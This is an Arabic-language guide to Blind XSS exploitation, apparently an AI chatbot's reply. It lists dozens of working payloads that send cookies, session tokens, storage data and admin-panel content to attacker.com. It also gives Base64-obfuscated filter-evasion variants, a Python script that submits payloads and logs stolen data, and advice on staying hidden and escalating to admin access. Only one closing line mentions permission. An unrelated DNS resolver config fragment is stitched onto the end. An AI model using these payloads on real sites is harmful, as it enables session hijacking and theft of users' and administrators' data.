{ #XSS_exploit }
## الخطوات العملية للحقن المستخدمة في Blind XSS
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة، رغم أن التنفيذ قد يحدث في سياقات داخلية.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المستلمة من الحقن.
   - افتح أدوات المطورين في المتصفح (F12) لاختبار الحقن محليًا إذا أمكن، وتحديد نقاط الإدخال المحتملة.
   - حدد نقاط الإدخال التي قد تُعالج في سياقات داخلية (مثل حقول التعليقات، نماذج التقارير، أو رسائل الدعم).

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن حقول أو معلمات تُرسل إلى أنظمة داخلية، مثل:
     - حقول التعليقات أو الملاحظات.
     - نماذج الدعم أو الشكاوى.
     - معلمات URL التي تُسجل في قواعد البيانات.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد ما إذا كانت البيانات تُعرض دون تنظيف في سياقات أخرى.
   - تحقق من السياقات التي قد يراها المشرفون (مثل لوحة تحكم، سجلات المستخدم، أو تقارير البيانات).

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript في نقطة الإدخال العرضة لتُنفذ في سياق داخلي.
   - صمم الحقنة لتكون مخفية وترسل البيانات إلى خادمك، مثل:
     - `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
     - `<img src="http://attacker.com/log?d=document.domain">`
   - جرب الحقن في سياقات مختلفة:
     - حقول تعليق: أدخل `<script>new Image().src='http://attacker.com/log?c='+document.cookie</script>` في حقل تعليق.
     - معلمات URL: `https://example.com/?comment=<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
     - نماذج دعم: أدخل `<img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>` في رسالة دعم.

4. **مراقبة الاستجابات**:
   - تحقق من خادمك الخارجي لتأكيد استلام البيانات:
     - **نجاح (True)**: البيانات (مثل ملفات تعريف الارتباط، النطاق، أو محتوى الصفحة) تظهر في سجلات الخادم.
     - **فشل (False)**: لا تصل بيانات، مما قد يعني عدم تنفيذ الحقنة أو حظرها (مثل بسبب CSP).
   - استخدم أدوات مثل Burp Suite أو سجلات الخادم لتحليل الطلبات الواردة.
   - انتظر فترة (قد تستغرق ساعات أو أيام) حتى يراجع المشرف أو النظام البيانات المُدخلة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا لم تصل بيانات، جرب أنواع حقن أخرى:
     - استخدام طرق إرسال مختلفة: `<img src>`، `fetch`، `WebSocket`، أو `navigator.sendBeacon`.
     - استهداف بيانات مختلفة: `document.cookie`، `document.body.innerHTML`، `localStorage`، أو `document.domain`.
     - تجنب الفلاتر: استخدم صيغ بديلة مثل `<img src=x onerror=...>` بدلاً من `<script>` إذا تم تصفية الوسوم.
   - اختبر نقاط إدخال متعددة (مثل حقول نماذج أخرى، رسائل الدعم، أو معلمات URL إضافية).
   - جرب حقنًا مع تعتيم (مثل تشفير Base64) لتجاوز فلاتر الإدخال.

6. **تأكيد السياق وتصعيد الهجوم (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<script>fetch('http://attacker.com/log?d='+document.domain)</script>` لمعرفة النطاق).
   - إذا نجحت الحقن، جرب استخراج بيانات حساسة أخرى (مثل `localStorage.getItem('token')` أو محتوى لوحة الإدارة).
   - قم بتصعيد الهجوم (مثل إنشاء حساب مشرف أو تعديل إعدادات) إذا سمحت البيانات المستخرجة.
   - حافظ على التخفي لتجنب الكشف (مثل تجنب التغييرات البصرية أو التنبيهات).

---

## جميع المحاولات الممكنة للحقن المستخدمة في Blind XSS
في الحقن المستخدمة في Blind XSS، المحاولات تركز على تنفيذ شيفرة JavaScript في سياقات غير مرئية وإرسال البيانات إلى خادم خارجي. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في حقول النماذج، معلمات URL، أو نقاط إدخال أخرى تُعالج في سياقات داخلية. الهدف هو تأكيد التنفيذ وجمع البيانات.
 { #XSS_exploit / #XSS_Idea_for_script_tag  }
#### أ. حقن لتأكيد التنفيذ

إرسال بيانات بسيطة لتأكيد أن الحقنة تُنفذ.
- **الحقن**: `<script>fetch('http://attacker.com/log?d='+encodeURIComponent(document.domain))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>fetch('http://attacker.com/log?d='+encodeURIComponent(document.domain))</script>`
  - **كيف يعمل**: يرسل نطاق الصفحة إلى خادم المهاجم.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<img src="http://attacker.com/log?d=document.domain">`
  - **الإدخال**: أدخل في نموذج دعم: `<img src="http://attacker.com/log?d=document.domain">`
  - **كيف يعمل**: يرسل النطاق عبر طلب صورة.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر `<script>`.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>`
  - **الإدخال**: `https://example.com/?comment=<script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>`
  - **كيف يعمل**: يرسل عنوان URL الحالي.
  - **متى يُستخدم؟**: لتحديد الصفحة التي تُنفذ فيها الحقنة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>`
  - **كيف يعمل**: يرسل معلومات المتصفح.
  - **متى يُستخدم؟**: لجمع بيانات الجهاز.
- **الحقن**: `<script>navigator.sendBeacon('http://attacker.com/log', 'Blind XSS Executed')</script>`
  - **الإدخال**: أدخل في رسالة دعم: `<script>navigator.sendBeacon('http://attacker.com/log', 'Blind XSS Executed')</script>`
  - **كيف يعمل**: يرسل رسالة تأكيد بشكل غير متزامن.
  - **متى يُستخدم؟**: لتأكيد التنفيذ بشكل موثوق.

#### ب. استخراج ملفات تعريف الارتباط
{  #XSS_exploit }
استخدام `document.cookie` لسرقة بيانات الجلسة.
- **الحقن**: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة جلسات المشرفين إذا لم يكن `HttpOnly` مفعلاً.
- **الحقن**: `<img src="http://attacker.com/log?c=document.cookie">`
  - **الإدخال**: أدخل في نموذج: `<img src="http://attacker.com/log?c=document.cookie">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر طلب صورة.
  - **متى يُستخدم؟**: لتجنب فلاتر `<script>`.
- **الحقن**: `<script>new WebSocket('ws://attacker.com').send(document.cookie)</script>`
  - **الإدخال**: `https://example.com/?comment=<script>new WebSocket('ws://attacker.com').send(document.cookie)</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر WebSocket.
  - **متى يُستخدم؟**: لتجاوز قيود HTTP أو CSP.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر طلب POST.
  - **متى يُستخدم؟**: لإرسال بيانات أكبر.
- **الحقن**: `<img src=x onerror=fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))>`
  - **الإدخال**: أدخل في رسالة دعم: `<img src=x onerror=fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<script>`.

#### ج. استخراج محتوى DOM
{ #XSS_exploit  / #XSS_DOM }
جمع محتوى الصفحة أو عناصر محددة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **الإدخال**: `https://example.com/?comment=<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **كيف يعمل**: يرسل محتوى الصفحة بالكامل إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى لوحة الإدارة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.getElementById('admin-panel').innerHTML)</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.getElementById('admin-panel').innerHTML)</script>`
  - **كيف يعمل**: يرسل محتوى عنصر معين (مثل لوحة الإدارة).
  - **متى يُستخدم؟**: لاستهداف عناصر حساسة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>`
  - **الإدخال**: أدخل في نموذج: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>`
  - **كيف يعمل**: يرسل قيم حقول الإدخال.
  - **متى يُستخدم؟**: لجمع بيانات النماذج.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>`
  - **الإدخال**: أدخل في رسالة دعم: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>`
  - **كيف يعمل**: يرسل عنوان الصفحة.
  - **متى يُستخدم؟**: لتحديد نوع الصفحة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.querySelector('.admin-data').innerText})</script>`
  - **الإدخال**: `https://example.com/?comment=<script>fetch('http://attacker.com/log', {method: 'POST', body: document.querySelector('.admin-data').innerText})</script>`
  - **كيف يعمل**: يرسل نص عنصر محدد بـ CSS selector.
  - **متى يُستخدم؟**: لاستخراج بيانات حساسة.

#### د. استخراج بيانات التخزين
{   #XSS_exploit}
استخدام `localStorage` و`sessionStorage` لسرقة بيانات الجلسة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة رموز المصادقة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>`
  - **الإدخال**: `https://example.com/?comment=<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>`
  - **كيف يعمل**: يرسل جميع بيانات `sessionStorage`.
  - **متى يُستخدم؟**: لجمع بيانات الجلسة المؤقتة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>`
  - **الإدخال**: أدخل في نموذج: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>`
  - **كيف يعمل**: يرسل بيانات مستخدم من `localStorage`.
  - **متى يُستخدم؟**: لاستخراج بيانات المشرف.

#### هـ. حقن مع التعتيم
{ #XSS_exploit  / #XSS_ecoded_payload }
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>fetch('http://attacker.com/log?c='+btoa(document.cookie))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>fetch('http://attacker.com/log?c='+btoa(document.cookie))</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط مشفرة بـ Base64.
  - **متى يُستخدم؟**: لتجنب فلاتر WAF.
- **الحقن**: `<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk='))</script>`
  - **الإدخال**: `https://example.com/?comment=<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk='))</script>`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجاوز أنظمة الكشف.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>`
  - **الإدخال**: أدخل في رسالة دعم: `<script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>`
  - **كيف يعمل**: يعكس ملفات تعريف الارتباط قبل الإرسال.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.
- **الحقن**: `<script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>`
  - **كيف يعمل**: يؤخر إرسال البيانات لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.
- **الحقن**: `<img src=x onerror=eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))>`
  - **الإدخال**: أدخل في نموذج: `<img src=x onerror=eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))>`
  - **كيف يعمل**: يفك تشفير Base64 عند فشل تحميل الصورة ويرسل البيانات.
  - **متى يُستخدم؟**: لتجاوز فلاتر صارمة.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة في Blind XSS وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تجمع بيانات مختلفة.
  - مثال قائمة:
    ```
    <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>
    <img src="http://attacker.com/log?d=document.domain">
    <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>
    <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>
    <img src=x onerror=fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))>
    ```
- **كيف يعمل**:
  - يتم إدخال الحقن في نقاط إدخال متعددة (مثل حقول تعليقات أو نماذج).
  - يتم مراقبة الخادم الخارجي لتأكيد استلام البيانات.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<script>fetch('http://localhost:8000/log?c='+encodeURIComponent(document.cookie))</script>",
      "<img src='http://localhost:8000/log?d=document.domain'>",
      "<script>fetch('http://localhost:8000/log', {method: 'POST', body: document.body.innerHTML})</script>",
      "<script>new Image().src='http://localhost:8000/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>",
      "<img src=x onerror=fetch('http://localhost:8000/log?c='+encodeURIComponent(document.cookie))>"
  ]

  target_url = "https://example.com/submit-comment"
  for payload in payloads:
      try:
          requests.post(target_url, data={"comment": payload})
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن إلى نقطة إدخال (مثل حقل تعليق) عبر طلب POST.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لنقاط إدخال متعددة.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن البيانات المستلمة في الخادم:
    - **ملفات تعريف الارتباط**: تحقق من وجود `sessionid` أو رموز الجلسة.
    - **محتوى DOM**: تحقق من النصوص أو العناصر المستخرجة (مثل لوحة الإدارة).
    - **بيانات السياق**: تحقق من النطاق أو عنوان URL.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح استخراج ملفات تعريف الارتباط.
- **كيف يعمل**:
  - يتم تسجيل البيانات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد السياقات القابلة للاستغلال.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>`).
  - جرب تقنيات إرسال أخرى (مثل FormData أو JSON).
  - اختبر استخراج بيانات أخرى (مثل `document.referrer` أو `navigator.geolocation`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.referrer})</script>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن لتأكيد التنفيذ:
- <script>fetch('http://attacker.com/log?d='+encodeURIComponent(document.domain))</script>: يرسل نطاق الصفحة.
- <img src="http://attacker.com/log?d=document.domain">: يرسل النطاق عبر طلب صورة.
- <script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>: يرسل عنوان URL الحالي.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>: يرسل معلومات المتصفح.
- <script>navigator.sendBeacon('http://attacker.com/log', 'Blind XSS Executed')</script>: يرسل رسالة تأكيد.

2. استخراج ملفات تعريف الارتباط:
- <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>: يرسل ملفات تعريف الارتباط.
- <img src="http://attacker.com/log?c=document.cookie">: يرسل ملفات تعريف الارتباط عبر طلب صورة.
- <script>new WebSocket('ws://attacker.com').send(document.cookie)</script>: يرسل ملفات تعريف الارتباط عبر WebSocket.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>: يرسل ملفات تعريف الارتباط عبر POST.
- <img src=x onerror=fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))>: يرسل ملفات تعريف الارتباط عند فشل الصورة.

3. استخراج محتوى DOM:
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>: يرسل محتوى الصفحة بالكامل.
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.getElementById('admin-panel').innerHTML)</script>: يرسل محتوى عنصر معين.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>: يرسل قيم حقول الإدخال.
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>: يرسل عنوان الصفحة.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.querySelector('.admin-data').innerText})</script>: يرسل نص عنصر محدد.

4. استخراج بيانات التخزين:
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>: يرسل رمز الجلسة من localStorage.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>: يرسل جميع بيانات sessionStorage.
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>: يرسل بيانات مستخدم من localStorage.

5. حقن مع التعتيم:
- <script>fetch('http://attacker.com/log?c='+btoa(document.cookie))</script>: يرسل ملفات تعريف الارتباط مشفرة بـ Base64.
- <script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk='))</script>: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>: يعكس ملفات تعريف الارتباط.
- <script>setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)</script>: يؤخر إرسال البيانات.
- <img src=x onerror=eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))>: يفك تشفير Base64 عند فشل الصورة.



---

**نصائح إضافية**:
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو خدمات مثل `ngrok` لتسجيل البيانات بسهولة، وتأكد من أن الخادم يدعم طلبات GET وPOST.
- **تجنب الكشف**: تجنب استخدام تنبيهات أو تغييرات بصرية (مثل `alert` أو `document.body.innerHTML`) للحفاظ على التخفي.
- **اختبار النقاط**: جرب نقاط إدخال متعددة (مثل التعليقات، رسائل الدعم، أو سجلات الأخطاء) لزيادة احتمالية التنفيذ.
- **التعتيم**: استخدم تشفير Base64، تقسيم الشيفرة، أو تأخير التنفيذ لتجاوز فلاتر الإدخال أو أنظمة WAF.
- **الأدوات**: استخدم أدوات مثل **XSStrike**، **Burp Suite**، أو **XSS Hunter** لتحديد نقاط إدخال Blind XSS ومراقبة الاستجابات.
- **الصبر**: قد يستغرق الأمر وقتًا حتى يراجع المشرف البيانات، لذا راقب خادمك لعدة أيام.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل Blind XSS في تطبيقات معينة)، أخبرني وسأقدم ردًا مخصصًا!



 Generated by NetworkManager nameserver 208.67.222.123 nameserver 208.67.220.123 nameserver 163.121.128.134 # NOTE: the libc resolver may not support more than 3 nameservers. # The nameservers listed below may not be recognized. nameserver 163.121.128.135 nameserver 192.168.1.1